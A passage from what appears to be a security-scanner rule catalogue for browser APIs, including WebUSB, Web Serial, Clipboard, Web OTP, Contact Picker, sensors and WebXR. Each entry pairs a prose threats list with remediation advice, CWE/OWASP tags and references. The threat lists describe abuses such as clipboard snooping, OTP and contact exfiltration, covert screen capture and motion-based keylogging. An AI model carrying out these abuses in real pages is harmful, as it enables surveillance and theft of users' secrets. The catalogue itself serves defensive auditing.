            "All paired devices enumeration: previously permitted USB devices revealed without user action, listing entire USB hardware inventory",
        ],
        "remediation": [
            "Always specify vendor and product ID filters in requestDevice() to restrict to intended device type",
            "Never transmit USB device serial numbers or identifiers to server — only transmit application-relevant data",
            "Implement device attestation before writing to any device — verify device identity and firmware signature",
            "Display clear UI showing which device the user is granting access to and for what purpose",
            "Never use WebUSB for firmware updates unless device authenticates itself with a signed challenge",
        ],
        "references": ["https://wicg.github.io/webusb/", "https://developer.mozilla.org/en-US/docs/Web/API/WebUSB_API"],
    },
    "web_bluetooth_security": {
        "severity": "HIGH",
        "short": "Web Bluetooth Device Fingerprinting/PHI",
        "cwe": "CWE-359", "owasp": "A07:2021",
        "threats": [
            "acceptAllDevices: all nearby Bluetooth devices visible — user may pair unintended device enabling cross-device attacks",
            "Paired device enumeration: getDevices() reveals user's Bluetooth hardware inventory for fingerprinting",
            "Health GATT data (PHI): heart rate/blood pressure/thermometer data from medical devices constitutes health information requiring HIPAA compliance",
            "Device name transmitted: Bluetooth device names (often containing personal info) sent to server for tracking",
            "Advertisement scanning: watchAdvertisements() passively tracks nearby Bluetooth devices — location correlation attack",
        ],
        "remediation": [
            "Always use specific optionalServices and service filters — never use acceptAllDevices: true",
            "Never send Bluetooth device.name, device.id, or GATT characteristic data to analytics services",
            "Obtain explicit HIPAA-compliant consent before reading health GATT characteristics",
            "Stop advertisement watching immediately after discovering the target device",
            "Validate GATT characteristic data server-side — Bluetooth data can be spoofed by malicious devices",
        ],
        "references": ["https://webbluetoothcg.github.io/web-bluetooth/", "https://developer.mozilla.org/en-US/docs/Web/API/Web_Bluetooth_API"],
    },
    "web_serial_security": {
        "severity": "CRITICAL",
        "short": "Web Serial API Injection Risk",
        "cwe": "CWE-74", "owasp": "A03:2021",
        "threats": [
            "Serial data from URL params: attacker crafts URL that sends malicious commands to industrial control, medical, or home automation devices",
            "No vendor/product filters: all connected serial devices accessible — user may grant access to unintended device (e.g., Arduino vs medical device)",
            "Port enumeration fingerprinting: getPorts() reveals USB vendor/product IDs of permitted serial devices",
            "No command validation: raw URL parameter data written to serial port can trigger arbitrary device commands",
            "Port info transmitted: usbVendorId/usbProductId sent to server identifies user's physical devices",
        ],
        "remediation": [
            "Never write data to serial port derived from URL parameters or user input without strict allowlist validation",
            "Always specify usbVendorId/usbProductId filters in requestPort() to restrict to intended device type",
            "Implement a command allowlist — only send predefined, validated commands to serial devices",
            "Never transmit serial port identification data to server — keep physical device identity client-side",
            "Log all serial commands for audit — serial device interactions may have physical-world consequences",
        ],
        "references": ["https://wicg.github.io/serial/", "https://developer.mozilla.org/en-US/docs/Web/API/Web_Serial_API"],
    },
    "screen_capture_security": {
        "severity": "HIGH",
        "short": "Screen Capture Consent/Leakage Risk",
        "cwe": "CWE-359", "owasp": "A07:2021",
        "threats": [
            "Auto-start getDisplayMedia: page begins capturing screen without explicit user gesture — unauthorized screen recording",
            "Full monitor capture: displaySurface:'monitor' captures all open applications, exposing passwords, banking, personal communications",
            "Screenshot transmitted to server: canvas.toDataURL() screen content sent to server — mass data exfiltration",
            "MediaRecorder + screen capture: screen session recorded and potentially transmitted without clear recording indicator",
            "Screen stream via WebSocket: real-time screen content streamed to server — continuous surveillance pattern",
        ],
        "remediation": [
            "Only call getDisplayMedia() in direct response to a user gesture (button click) — never on page load",
            "Show a persistent, unmissable recording indicator (blinking red dot) whenever screen capture is active",
            "Prefer displaySurface:'browser' to restrict capture to browser tab, not entire screen",
            "Never automatically transmit screen capture data — require explicit user 'share' confirmation before sending",
            "Implement Content Security Policy to restrict where captured screen data can be sent",
        ],
        "references": ["https://w3c.github.io/mediacapture-screen-share/", "https://developer.mozilla.org/en-US/docs/Web/API/Screen_Capture_API"],
    },
    "geolocation_api_security": {
        "severity": "HIGH",
        "short": "Geolocation Privacy/Tracking Risk",
        "cwe": "CWE-359", "owasp": "A07:2021",
        "threats": [
            "Location shared with analytics: precise GPS coordinates sent to third-party analytics violates GDPR without explicit consent",
            "watchPosition without clearWatch: continuous GPS tracking runs indefinitely, draining battery and recording all user movements",
            "enableHighAccuracy: GPS-level precision requested when city-level (IP geolocation) suffices — maximizes privacy intrusion",
            "Location transmitted without consent UI: coordinates collected before user acknowledges what location is used for",
            "High-accuracy location fingerprint: combines device movement patterns with other fingerprinting data for persistent tracking",
        ],
        "remediation": [
            "Request geolocation only in direct response to user action (e.g., 'Find near me' button click)",
            "Show explicit consent notice before calling getCurrentPosition() explaining the purpose and data retention",
            "Use enableHighAccuracy:false for non-navigation use cases — city-level accuracy is sufficient for most features",
            "Always call clearWatch() when location tracking is no longer needed — tie to component unmount or feature deactivation",
            "Never send raw GPS coordinates to third-party analytics — use coarsened or anonymized location where possible",
        ],
        "references": ["https://w3c.github.io/geolocation-api/", "https://gdpr.eu/article-9-processing-special-categories-of-personal-data/"],
    },
    "performance_observer_security": {
        "severity": "MEDIUM",
        "short": "Performance Timing Side-Channel",
        "cwe": "CWE-208", "owasp": "A07:2021",
        "threats": [
            "Resource timing oracle: timing differences in cross-origin resource fetches reveal if user is authenticated on other sites",
            "Navigation timing leakage: domComplete/loadEventEnd expose backend rendering time, revealing server load and caching state",
            "Timing data shared with analytics: load times sent to third-party reveal network speed, ISP, and device performance",
            "Fine-grained performance.now() around fetch: timing oracle distinguishes 401 vs 200 responses in under 1ms",
            "transferSize enumeration: resource sizes reveal content even without reading body (cross-origin size oracle)",
        ],
        "remediation": [
            "Implement Timing-Allow-Origin headers only for resources where cross-origin timing disclosure is acceptable",
            "Restrict Resource Timing API via Permissions Policy: 'timing-allow-origins' to limit which origins can measure",
            "Never transmit raw timing measurements to third-party analytics — derive only aggregate metrics server-side",
            "Add artificial timing noise in server responses for authenticated resources to defeat timing oracles",
            "Review use of performance.now() around authentication-related network calls",
        ],
        "references": ["https://w3c.github.io/resource-timing/", "https://developer.mozilla.org/en-US/docs/Web/API/Performance_API"],
    },
    "intersection_observer_security": {
        "severity": "MEDIUM",
        "short": "IntersectionObserver Behavioral Tracking",
        "cwe": "CWE-359", "owasp": "A07:2021",
        "threats": [
            "Invisible pixel tracking: 1x1px element fires network request when user scrolls to it — records page attention without cookies",
            "Scroll depth/attention transmitted: isIntersecting events sent to server build behavioral profile of reading habits",
            "Third-party analytics visibility: viewability events sent to ad/analytics providers — persistent user behavior profiling",
            "Form interaction tracking: observing form fields reveals which fields user saw, even before filling them",
            "Threshold:0 invisible elements: zero-threshold observer fires for any pixel of any element entering viewport — aggressive tracking",
        ],
        "remediation": [
            "Disclose all scroll tracking and viewability measurement to users in privacy policy",
            "Avoid transmitting raw intersection data to third parties — aggregate server-side with minimal PII",
            "Never track form field visibility — this reveals user intent before submission and may violate privacy regulations",
            "Use threshold values appropriate to genuine viewability measurement (0.5+ for meaningful view) not surveillance",
            "Implement a consent mechanism before starting IntersectionObserver tracking",
        ],
        "references": ["https://w3c.github.io/IntersectionObserver/", "https://developer.mozilla.org/en-US/docs/Web/API/Intersection_Observer_API"],
    },
    "media_source_extension_security": {
        "severity": "HIGH",
        "short": "MSE Codec Injection / DRM Weakness",
        "cwe": "CWE-74", "owasp": "A03:2021",
        "threats": [
            "Video source from URL param: attacker crafts URL injecting malicious video blob that exploits browser codec parser vulnerabilities",
            "addSourceBuffer MIME from URL param: forcing arbitrary codec MIME type can crash codec handlers or trigger memory safety bugs",
            "ClearKey DRM: org.w3.clearkey has no real content protection — encryption keys distributed in plain JSON alongside encrypted content",
            "Cleartext media segments: HTTP media fetch vulnerable to MITM substituting segments with malicious content or tracking beacons",
            "Arbitrary blob URL injection: URL.createObjectURL(untrusted) bypasses CSP and can execute arbitrary media-triggered JavaScript",
        ],
        "remediation": [
            "Never derive media source URLs or MIME types from URL parameters — hardcode from allowlist",
            "Validate and allowlist addSourceBuffer() MIME types before calling — reject anything not in the expected set",
            "Use Widevine/FairPlay/PlayReady DRM for protected content — ClearKey is only for testing",
            "Fetch all media manifest and segment files over HTTPS with CORS enabled and SRI hashes where feasible",
            "Implement CSP media-src directive to restrict from which origins media content can be loaded",
        ],
        "references": ["https://w3c.github.io/media-source/", "https://www.w3.org/TR/encrypted-media/"],
    },
    "webcodecs_security": {
        "severity": "MEDIUM",
        "short": "WebCodecs Timing / Decoder Injection",
        "cwe": "CWE-203", "owasp": "A05:2021",
        "threats": [
            "Decode input from URL params: attacker-controlled codec input can trigger decoder crashes or memory corruption in native codec handlers",
            "Timing side-channel: measuring decode duration leaks information about media content through timing oracles",
            "SharedArrayBuffer with WebCodecs: enables Spectre-class cross-thread memory reads at high timer resolution",
            "Encoded output transmitted: A/V streams containing sensitive screen or microphone content silently exfiltrated",
            "Missing error handler: unhandled decoder errors can cause page crashes or silent data loss",
        ],
        "remediation": [
            "Never derive VideoDecoder input from URL parameters — validate and sanitize all codec input sources",
            "Avoid exposing encoded output to remote endpoints without explicit user consent and data classification review",
            "Use COOP/COEP headers to opt in to isolation before enabling SharedArrayBuffer with codec workloads",
            "Implement error: callbacks on all VideoDecoder/AudioDecoder instances",
            "Measure decode timing only in controlled environments — never transmit timing deltas to analytics endpoints",
        ],
        "references": ["https://www.w3.org/TR/webcodecs/", "https://developer.mozilla.org/en-US/docs/Web/API/WebCodecs_API"],
    },
    "eyedropper_api_security": {
        "severity": "MEDIUM",
        "short": "EyeDropper Screen Color Sampling",
        "cwe": "CWE-359", "owasp": "A01:2021",
        "threats": [
            "Auto-trigger on load: opening EyeDropper without user gesture captures screen colors covertly at page load",
            "Color shared with analytics: sampled screen colors sent to third-party tracking endpoints for fingerprinting",
            "No consent notice: color data transmitted to server without informing the user of screen capture intent",
            "Rapid loop sampling: repeated EyeDropper calls in an animation loop reconstruct screen content over time",
            "Screen content inference: pixel-by-pixel sampling can reconstruct visible text, passwords, and sensitive documents",
        ],
        "remediation": [
            "EyeDropper.open() must only be called within a trusted user gesture handler (click, keypress)",
            "Display a visible consent banner before sampling and transmitting any color data",
            "Never send sampled color values to third-party analytics or advertising endpoints",
            "Avoid EyeDropper in loops — each call should be discrete and directly tied to a user action",
            "Store minimum necessary color data and discard immediately after the UX operation completes",
        ],
        "references": ["https://wicg.github.io/eyedropper-api/", "https://developer.mozilla.org/en-US/docs/Web/API/EyeDropper"],
    },
    "resize_observer_security": {
        "severity": "LOW",
        "short": "ResizeObserver Layout Fingerprinting",
        "cwe": "CWE-359", "owasp": "A05:2021",
        "threats": [
            "Dimensions transmitted: element size data sent to analytics reveals viewport, font, and zoom settings — passive fingerprinting",
            "Bulk observe across many elements: reconstructs complete layout tree dimensions for precise device fingerprinting",
            "Cross-origin iframe dimension probing: ResizeObserver on embedded iframes can leak cross-origin content dimensions",
            "No disconnect: ResizeObserver left running permanently enables continuous passive monitoring of layout changes",
            "Analytics combined with dimensions: width/height data piped to gtag/mixpanel builds persistent cross-session device profile",
        ],
        "remediation": [
            "Avoid transmitting element dimensions to analytics endpoints — review what layout data is genuinely needed",
            "Call ro.disconnect() when the observation is no longer needed (component unmount, page hide)",
            "Do not observe cross-origin iframe elements — this may constitute cross-origin information leakage",
            "Limit ResizeObserver to the specific elements that need responsive behaviour; avoid bulk querySelectorAll patterns",
            "Aggregate or round dimensions before any server-side transmission to limit fingerprinting precision",
        ],
        "references": ["https://www.w3.org/TR/resize-observer/", "https://developer.mozilla.org/en-US/docs/Web/API/ResizeObserver"],
    },
    "compression_streams_security": {
        "severity": "HIGH",
        "short": "BREACH Compression Oracle / Zip Bomb",
        "cwe": "CWE-311", "owasp": "A02:2021",
        "threats": [
            "BREACH oracle: compressing secrets concatenated with attacker-controlled input leaks secret length via compressed size — same attack class as BREACH/CRIME",
            "Decompress from URL param: decompressing attacker-supplied data risks zip bombs (>1000x expansion ratio) causing OOM/DoS",
            "No size limit: DecompressionStream without a byte limit allows decompressed output to exhaust browser memory",
            "Size oracle: transmitting compressed byte length enables inference of plaintext content length",
            "Compressed secrets transmitted: even encrypted transport of compressed+secret data is vulnerable to adaptive chosen-plaintext",
        ],
        "remediation": [
            "Never concatenate secrets with user-controlled data before compression — compress them separately",
            "Enforce a maximum decompressed size limit before feeding remote data into DecompressionStream",
            "Validate and sanitize all compressed input sources — reject data from untrusted URL parameters",
            "Do not transmit the compressed size of responses containing sensitive content",
            "Use random padding or chunked streaming to obscure compressed output length from network observers",
        ],
        "references": ["https://www.breachattack.com/", "https://www.w3.org/TR/compression-streams/"],
    },
    "web_nfc_security": {
        "severity": "HIGH",
        "short": "Web NFC Contactless Exfiltration",
        "cwe": "CWE-284", "owasp": "A01:2021",
        "threats": [
            "Auto-scan on load: page starts scanning NFC tags without user gesture — silently reads contactless payment cards in range",
            "Write from URL param: attacker crafts URL to inject arbitrary NFC payload written to nearby tags",
            "Contactless data exfiltration: NDEF record data (URLs, text, MIME) from scanned tags transmitted to attacker server",
            "Sensitive types in NFC records: auth tokens or payment card data written to or read from NFC tags",
            "Missing permission denial: uncaught NotAllowedError leads to silent failure and possible fallback to insecure path",
        ],
        "remediation": [
            "Only initiate NDEFReader.scan() within a trusted user gesture handler — never on page load or automatically",
            "Never derive NFC write payloads from URL parameters — hardcode payload from server-side allowlist",
            "Validate and sanitize all NDEF records before processing — reject unexpected record types",
            "Do not transmit raw NFC record data to remote endpoints — process locally and store only necessary fields",
            "Always handle NotAllowedError and AbortError in NFC permission flows",
        ],
        "references": ["https://w3c.github.io/web-nfc/", "https://developer.mozilla.org/en-US/docs/Web/API/Web_NFC_API"],
    },
    "ambient_light_security": {
        "severity": "MEDIUM",
        "short": "Ambient Light Sensor Screen Inference",
        "cwe": "CWE-359", "owasp": "A05:2021",
        "threats": [
            "Screen content inference: high-frequency illuminance sampling can reconstruct screen content via light reflected from the user's face",
            "Cross-site tracking: illuminance values shared with analytics build an environment fingerprint persistent across sites",
            "High frequency config: sensor configured at >50 Hz enables timing-based side-channel attacks",
            "Missing error handling: sensor availability varies by OS permission — unhandled errors expose fallback paths",
            "Device environment profiling: ambient light patterns (day/night, indoor/outdoor) linked to user identity over time",
        ],
        "remediation": [
            "Avoid sampling AmbientLightSensor at high frequency (>10 Hz) — batch samples and round values",
            "Never transmit illuminance or lux values to analytics or advertising endpoints",
            "Cap sensor frequency at 10 Hz or lower and quantize readings to reduce precision",
            "Handle SecurityError and NotAllowedError in sensor permission flows",
            "Declare the 'ambient-light-sensor' permissions policy in response headers to explicitly restrict cross-origin usage",
        ],
        "references": ["https://www.w3.org/TR/ambient-light/", "https://developer.mozilla.org/en-US/docs/Web/API/AmbientLightSensor"],
    },
    "device_motion_security": {
        "severity": "HIGH",
        "short": "Device Motion Keylogging / Fingerprinting",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "threats": [
            "Keylogging via motion: vibration micro-patterns from keypresses can be matched to keystrokes with ML classifiers",
            "Inertial navigation: accelerometer integration can reconstruct walking route and physical location without GPS permission",
            "Motion fingerprinting: gyroscope/accelerometer bias is unique per device — enables cross-site device tracking",
            "Analytics sharing: acceleration and rotation data piped to third-party analytics enables passive profiling",
            "Missing iOS requestPermission: devicemotion events are silently blocked on iOS 13+ without DeviceMotionEvent.requestPermission()",
        ],
        "remediation": [
            "Always call DeviceMotionEvent.requestPermission() on iOS 13+ before subscribing to devicemotion events",
            "Avoid correlating devicemotion events with keyboard or input events — remove this logic entirely",
            "Do not transmit raw acceleration or rotation data to analytics endpoints — aggregate and anonymize",
            "Declare the 'accelerometer' and 'gyroscope' permissions policy in response headers",
            "Sample at the lowest acceptable frequency and quantize values to limit fingerprinting precision",
        ],
        "references": ["https://www.w3.org/TR/device-orientation/", "https://developer.mozilla.org/en-US/docs/Web/API/Device_orientation_events"],
    },
    "vibration_api_security": {
        "severity": "MEDIUM",
        "short": "Vibration Covert Channel / DoS",
        "cwe": "CWE-400", "owasp": "A05:2021",
        "threats": [
            "Covert haptic channel: vibration pattern encodes session tokens or user IDs — observable by another app with motion sensor access",
            "URL-param controlled pattern: attacker crafts URL to trigger arbitrary vibration sequences including sustained DoS pulses",
            "Rapid loop DoS: navigator.vibrate in setInterval exhausts device battery and can cause device overheating",
            "Excessive duration: single vibrate(60000) call can render device unresponsive for extended period",
            "Long pattern array: many-element pattern array causes browser to queue prolonged haptic output",
        ],
        "remediation": [
            "Never derive vibration patterns from URL parameters, user input, or session data",
            "Limit vibration to short, user-gesture-triggered feedback only — no automatic or loop-based vibration",
            "Cap single vibration duration to ≤1000ms and total pattern length to ≤5 entries",
            "Do not call navigator.vibrate inside setInterval, requestAnimationFrame, or while loops",
            "Consider Feature Policy: disable the 'vibrate' feature for embedded third-party frames",
        ],
        "references": ["https://www.w3.org/TR/vibration/", "https://developer.mozilla.org/en-US/docs/Web/API/Navigator/vibrate"],
    },
    "generic_sensor_security": {
        "severity": "MEDIUM",
        "short": "Generic Sensor Fingerprinting / Tracking",
        "cwe": "CWE-359", "owasp": "A05:2021",
        "threats": [
            "Device fingerprinting: gyroscope/magnetometer bias values are unique per physical device — enable persistent cross-site device identity",
            "Analytics sharing: XYZ orientation values sent to analytics build long-term device profile without user knowledge",
            "Indoor positioning: magnetometer heading infers indoor position and navigation without requiring GPS permission",
            "High frequency sampling: sensors configured at 100+ Hz provide timing resolution sufficient for acoustic eavesdropping research",
            "Missing permission handling: Generic Sensor API silently fails in restrictive permission policies without proper error handling",
        ],
        "remediation": [
            "Limit sensor frequency to the minimum required (≤10 Hz for most use cases)",
            "Never transmit raw XYZ sensor values to analytics or third-party endpoints",
            "Handle SecurityError and NotAllowedError from all Generic Sensor API instantiation",
            "Declare sensor permissions policy headers (gyroscope, magnetometer, accelerometer) explicitly",
            "Quantize sensor readings to reduce fingerprinting resolution before any use",
        ],
        "references": ["https://www.w3.org/TR/generic-sensor/", "https://developer.mozilla.org/en-US/docs/Web/API/Sensor_APIs"],
    },
    "user_timing_security": {
        "severity": "LOW",
        "short": "User Timing Data Leakage / XS-Leak",
        "cwe": "CWE-203", "owasp": "A05:2021",
        "threats": [
            "Sensitive mark names: marks like 'user-checkout-complete' reveal user flow and feature usage to anyone with DevTools or reading the Performance API",
            "Duration to analytics: measure() durations piped to analytics expose user behaviour timing and device capability fingerprinting",
            "Cross-origin timing probe: performance.mark around cross-origin loads probes whether resources exist (XS-Leak via timing oracle)",
            "Performance entry exfiltration: getEntries() results transmitted to server reveal complete navigation and resource timing",
            "Device performance fingerprinting: duration variances fingerprint CPU speed, memory, and device class",
        ],
        "remediation": [
            "Use opaque mark names that do not reveal business logic (e.g., 'phase-1' not 'user-login-complete')",
            "Never transmit performance.measure() durations to analytics without explicit user consent",
            "Be aware that cross-origin resource timing can be used as an XS-Leak vector — use Timing-Allow-Origin carefully",
            "Restrict what DevTools exposes via mark names in production builds",
            "Aggregate and round timing values server-side; do not expose raw millisecond precision to third parties",
        ],
        "references": ["https://www.w3.org/TR/user-timing/", "https://developer.mozilla.org/en-US/docs/Web/API/Performance/mark"],
    },
    "background_sync_security": {
        "severity": "HIGH",
        "short": "Background Sync Deferred Exfiltration",
        "cwe": "CWE-359", "owasp": "A01:2021",
        "threats": [
            "Deferred exfiltration: background sync queues data from localStorage when offline and transmits on reconnect — bypasses network controls",
            "Sensitive sync tags: sync tag names are enumerable via getTags() — embedding user IDs or tokens leaks identity",
            "Periodic sync background collection: page runs code and makes network requests on a schedule without user interaction",
            "Short periodic interval: very short minInterval causes near-continuous background data collection",
            "Tag enumeration: getTags() reveals pending sync state to any code in the service worker scope",
        ],
        "remediation": [
            "Never embed user IDs, tokens, or sensitive identifiers in sync tag names — use opaque UUIDs",
            "Limit background sync to retrying failed user-initiated actions only — not speculative data collection",
            "Set generous minInterval on periodic sync (≥24h) and collect only non-sensitive telemetry",
            "Audit service worker sync handlers to ensure they only process pre-staged, minimal payloads",
            "Restrict Background Sync via Permissions Policy header in responses",
        ],
        "references": ["https://wicg.github.io/background-sync/", "https://developer.mozilla.org/en-US/docs/Web/API/Background_Synchronization_API"],
    },
    "push_api_security": {
        "severity": "HIGH",
        "short": "Push API Subscription Exfiltration / Silent Push",
        "cwe": "CWE-284", "owasp": "A01:2021",
        "threats": [
            "Silent push: userVisibleOnly:false attempts covert background push without notification — can exfiltrate data silently",
            "Missing VAPID: subscription without applicationServerKey allows any server to send push to the endpoint",
            "Subscription endpoint to analytics: push subscription URL is a stable, unique tracking token across sessions",
            "Push payload logged: event.data content in console exposes push message content to DevTools sessions",
            "Push amplification: push handler that makes outbound fetch requests can be weaponized for network-level DoS",
        ],
        "remediation": [
            "Always set userVisibleOnly:true — never attempt silent push",
            "Always provide applicationServerKey (VAPID) in pushManager.subscribe() to authenticate your push server",
            "Never share the push subscription endpoint with third-party analytics or advertising systems",
            "Remove all console.log/warn/error calls on push payload content in production",
            "Validate push message origin and content before processing — treat all push payloads as untrusted input",
        ],
        "references": ["https://www.w3.org/TR/push-api/", "https://developer.mozilla.org/en-US/docs/Web/API/Push_API"],
    },
    "window_management_security": {
        "severity": "MEDIUM",
        "short": "Window Management Screen Fingerprinting",
        "cwe": "CWE-359", "owasp": "A05:2021",
        "threats": [
            "Multi-screen fingerprinting: getScreenDetails() reveals exact screen count, resolutions, and arrangement — unique device fingerprint",
            "Screen layout to analytics: screens array transmitted to analytics enables persistent device tracking across sessions",
            "Non-visible screen placement: window.open() with screen coordinates can place browser windows on secondary screens invisibly",
            "Screen arrangement inference: screen positions and labels reveal desk setup, work patterns, and hardware configuration",
            "Missing permission handling: NotAllowedError from getScreenDetails() must be caught — permission denied leaks silently",
        ],
        "remediation": [
            "Never transmit screen details, counts, or layouts to analytics or third-party endpoints",
            "Catch NotAllowedError from getScreenDetails() and degrade gracefully",
            "Declare the 'window-management' permissions policy header to restrict usage to specific origins",
            "When placing windows programmatically, validate coordinates stay within visible screen bounds",
            "Only request window-management permission after a user interaction that explicitly requires multi-screen functionality",
        ],
        "references": ["https://www.w3.org/TR/window-management/", "https://developer.mozilla.org/en-US/docs/Web/API/Window_Management_API"],
    },
    "document_pip_security": {
        "severity": "HIGH",
        "short": "Document PiP Sensitive Content / Auto-Open",
        "cwe": "CWE-359", "owasp": "A01:2021",
        "threats": [
            "Sensitive DOM in floating window: password fields, auth tokens, or card numbers cloned into PiP window visible across desktops",
            "Auto-open without gesture: requestWindow() on page load violates user-gesture requirement and can surprise users",
            "Parent DOM access from PiP: pipWindow.opener grants same-origin access back to the parent page from the floating context",
            "Data exfiltration via PiP: malicious script in PiP context can fetch data and transmit without user noticing the floating window",
            "Persistent UI after navigation: PiP windows survive page navigation — stale, misleading content may persist",
        ],
        "remediation": [
            "Never clone password fields, authentication tokens, or payment data into a PiP window",
            "Only call documentPictureInPicture.requestWindow() in response to explicit user gestures (click/keypress)",
            "Catch NotAllowedError from requestWindow() and handle gracefully",
            "Audit all JavaScript executing in PiP context — it has same-origin DOM access to the parent page",
            "Clear PiP window content on page navigation events to prevent stale UI leakage",
        ],
        "references": ["https://wicg.github.io/document-picture-in-picture/", "https://developer.mozilla.org/en-US/docs/Web/API/Document_Picture-in-Picture_API"],
    },
    "notification_api_security": {
        "severity": "MEDIUM",
        "short": "Notification Permission Spam / Data in Body",
        "cwe": "CWE-359", "owasp": "A05:2021",
        "threats": [
            "Auto permission request: Notification.requestPermission() on page load triggers browser prompt before user interacts — permission spam",
            "Sensitive content in body: notification body visible on device lock screen — password/token in body exposed to physical observers",
            "Attacker-controlled content: notification title/body derived from URL parameters enables notification injection attacks",
            "Click handler redirect: notification onclick navigates to URL from payload — open redirect via user-trusted notification",
            "Third-party notification access: analytics scripts requesting or creating notifications on behalf of the page",
        ],
        "remediation": [
            "Request notification permission only after user has explicitly opted in via a visible UI control",
            "Never include passwords, authentication tokens, card numbers, or session identifiers in notification body",
            "Sanitize all notification content from server push payloads — never embed URL parameters directly",
            "Validate notification click handler URLs against an allowlist before navigation",
            "Restrict Notification API from third-party frames via Permissions Policy header",
        ],
        "references": ["https://www.w3.org/TR/notifications/", "https://developer.mozilla.org/en-US/docs/Web/API/Notifications_API"],
    },
    "screen_wake_lock_security": {
        "severity": "LOW",
        "short": "Screen Wake Lock Battery Drain / Activity Leak",
        "cwe": "CWE-400", "owasp": "A05:2021",
        "threats": [
            "Persistent screen-on: wake lock never released exhausts device battery and prevents automatic screen lock (security boundary)",
            "Auto-acquire on load: wake lock requested on page load without user interaction — prevents device sleep across sessions",
            "Loop re-acquisition: setInterval re-acquiring wake lock creates uninterruptible keep-alive — system resource abuse",
            "Activity inference: wake lock state transmitted to analytics reveals whether user is actively engaging with the page",
            "Missing visibility handler: wake lock persists when tab is hidden — device stays awake even when user switches apps",
        ],
        "remediation": [
            "Always release the wake lock sentinel when it is no longer needed (component unmount, task complete)",
            "Listen to document.addEventListener('visibilitychange') and release wake lock when document becomes hidden",
            "Only acquire wake lock in direct response to a user-initiated action (button click, form submit)",
            "Avoid re-acquiring wake lock inside setInterval or requestAnimationFrame",
            "Do not transmit wake lock status to analytics endpoints",
        ],
        "references": ["https://www.w3.org/TR/screen-wake-lock/", "https://developer.mozilla.org/en-US/docs/Web/API/Screen_Wake_Lock_API"],
    },
    "web_otp_security": {
        "severity": "HIGH",
        "short": "Web OTP Interception / Leakage",
        "cwe": "CWE-522", "owasp": "A07:2021",
        "threats": [
            "OTP to analytics: one-time codes transmitted to third-party analytics endpoints compromise authentication bypasses",
            "OTP stored locally: localStorage/sessionStorage storage of OTPs defeats single-use guarantee — replay attacks possible",
            "No AbortController: OTP credential request without abort signal hangs indefinitely, blocking UI and consuming resources",
            "Auto-read on load: OTP API triggered on page load without user interaction starts SMS reading covertly",
            "OTP forwarded externally: forwarding OTP code to a non-same-origin endpoint hands attackers the authentication factor",
        ],
        "remediation": [
            "Never transmit OTP codes to analytics or third-party endpoints — they are authentication secrets",
            "Never store OTP codes in localStorage, sessionStorage, or cookies — use them immediately and discard",
            "Always use AbortController with a timeout when calling navigator.credentials.get({otp: ...})",
            "Only initiate OTP requests in response to user action (button click)",
            "Verify OTP codes server-side only — never trust client-side OTP validation",
        ],
        "references": ["https://wicg.github.io/web-otp/", "https://developer.mozilla.org/en-US/docs/Web/API/OTPCredential"],
    },
    "contact_picker_security": {
        "severity": "HIGH",
        "short": "Contact Picker Mass PII Exfiltration",
        "cwe": "CWE-359", "owasp": "A01:2021",
        "threats": [
            "Mass contact grab: requesting name+email+tel+address in one call harvests complete phonebook contact records",
            "multiple:true full phonebook: all contacts selected at once enables complete addressbook exfiltration",
            "Contact data to server: email addresses, phone numbers, and physical addresses uploaded to remote endpoint",
            "Analytics PII leakage: contact email/tel shared with third-party analytics for cross-site identity matching",
            "Insecure local storage: contact data persisted in localStorage is XSS-accessible — entire addressbook at risk",
        ],
        "remediation": [
            "Request only the minimum necessary contact properties for the specific feature being implemented",
            "Avoid multiple:true unless the user explicitly needs to select multiple contacts for a specific task",
            "Never transmit contact data to analytics or advertising endpoints — this is third-party PII sharing",
            "Do not persist contact data in localStorage or sessionStorage — process and discard after use",
            "Present clear disclosure to users about which contact fields are collected and why",
        ],
        "references": ["https://wicg.github.io/contact-api/spec/", "https://developer.mozilla.org/en-US/docs/Web/API/Contact_Picker_API"],
    },
    "clipboard_api_security": {
        "severity": "HIGH",
        "short": "Clipboard Snooping / Poisoning",
        "cwe": "CWE-359", "owasp": "A01:2021",
        "threats": [
            "Auto clipboard read: navigator.clipboard.readText() on page load reads clipboard without user awareness — captures passwords, tokens, PII",
            "Paste event sniffing: paste event listener transmitting content silently exfiltrates whatever user recently copied",
            "Clipboard content to server: copied passwords, API keys, credit card numbers, or private text sent to remote endpoint",
            "Third-party clipboard access: analytics scripts reading or logging clipboard data for cross-site tracking",
            "Clipboard poisoning: writeText() injecting javascript: URLs or XSS payloads into clipboard for social engineering attacks",
        ],
        "remediation": [
            "Only read clipboard in direct response to a user paste gesture — never on page load or timers",
            "Never transmit clipboard content to remote endpoints or analytics systems",
            "Validate and sanitize any content written to clipboard via writeText() — reject protocol handlers and script tags",
            "Restrict clipboard permissions via Permissions Policy header for third-party iframes",
            "Log clipboard access attempts to security monitoring for anomaly detection",
        ],
        "references": ["https://www.w3.org/TR/clipboard-apis/", "https://developer.mozilla.org/en-US/docs/Web/API/Clipboard_API"],
    },
    "webxr_security": {
        "severity": "HIGH",
        "short": "WebXR Spatial Data / Room Capture",
        "cwe": "CWE-359", "owasp": "A01:2021",
        "threats": [
            "Auto XR session: requestSession() on load starts XR without user gesture — violates browser security model",
            "Immersive AR camera: camera pass-through in AR mode captures real-world video of user's physical environment",
            "Depth sensing: depthSensing/rawCamera APIs create 3D map of user's room, objects, and physical layout",
            "Pose/position transmitted: user head position and orientation over time reveals movement patterns and physical setup",
            "Spatial data to analytics: XR tracking data sent to third parties enables physical-world user profiling",
        ],
        "remediation": [
            "Only call navigator.xr.requestSession() within a trusted user gesture handler",
            "Request minimum necessary XR features — avoid requestedFeatures like 'depth-sensing' or 'camera-access' unless essential",
            "Never transmit XR pose, position, or orientation data to analytics or third-party endpoints",
            "Call session.end() in component cleanup and on page visibility change",
            "Display clear consent UI explaining what sensor access an XR session requires before initiating",
        ],
        "references": ["https://www.w3.org/TR/webxr/", "https://developer.mozilla.org/en-US/docs/Web/API/WebXR_Device_API"],
    },
    "web_audio_security": {
        "severity": "MEDIUM",
        "short": "Web Audio Fingerprinting / Mic Capture",
        "cwe": "CWE-359", "owasp": "A05:2021",
        "threats": [
            "AudioContext fingerprinting: sampleRate, maxChannelCount, and timing characteristics uniquely identify GPU/audio hardware cross-site",
            "Covert mic processing: microphone stream routed to AudioContext for analysis without visible recording indicator",
            "AnalyserNode exfiltration: frequency domain data captures ambient audio characteristics for environment fingerprinting",
            "AudioBuffer channel data transmitted: raw PCM audio samples uploaded — voice recognition and acoustic inference possible",
            "Audio steganography: OscillatorNode with sensitive data context can encode secrets as inaudible ultrasonic tones",
        ],
        "remediation": [
